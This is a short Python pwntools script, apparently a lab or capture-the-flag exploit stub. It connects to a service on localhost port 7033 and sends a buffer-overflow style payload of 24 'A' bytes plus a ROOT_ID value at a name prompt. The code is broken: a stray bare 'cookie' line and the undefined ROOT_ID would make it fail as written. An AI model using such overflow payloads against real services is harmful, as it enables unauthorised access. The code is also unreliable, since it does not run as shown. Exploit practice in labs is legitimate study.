from pwn import *

# Set the target host and port
target_host = '127.0.0.1'
target_port = 7033

cookie
# Connect to the target
p = remote(target_host, target_port)

try:
    # Receive and print the initial message from the server
    initial_message = p.recvline()
    print(f"[*] Received initial message: {initial_message.decode()}")

    # Send a line when prompted for a name
    payload = b"A"*24 + ROOT_ID

    p.sendline(payload)       # Send the payload

    # Receive and print the response from the server
    response = p.recvline()
    print(f"[*] Received response: {response.decode()}")

    # You can continue sending and receiving data as needed
    # For example:
    # p.sendline("Next input")
    # next_response = p.recvline()
    # print(f"[*] Received next response: {next_response.decode()}")

finally:
    # Close the connection
    p.close()
